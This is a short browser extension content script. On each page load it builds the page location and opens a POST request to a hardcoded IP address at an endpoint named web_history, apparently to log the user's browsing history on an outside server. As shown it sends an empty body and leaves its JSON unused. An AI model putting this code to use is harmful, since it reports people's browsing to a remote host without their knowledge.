// content.js

window.onload = function () {
  //alert('sending data!');
  var location = window.location;
  json = JSON.stringify(location);
  var xhr = new XMLHttpRequest();
  //  xhr.open('POST', 'https://localhost/process_post?myQuery=' + location , true);
  xhr.open("POST", "https://134.68.176.201:9000/web_history", true);
  xhr.send(null);
};

function url() {
  if (window.location.href == "data:text/html,chromewebdata") {
    return document.title.match(/([^ ]*)/).pop();
  } else {
    return document.location.href;
  }
}
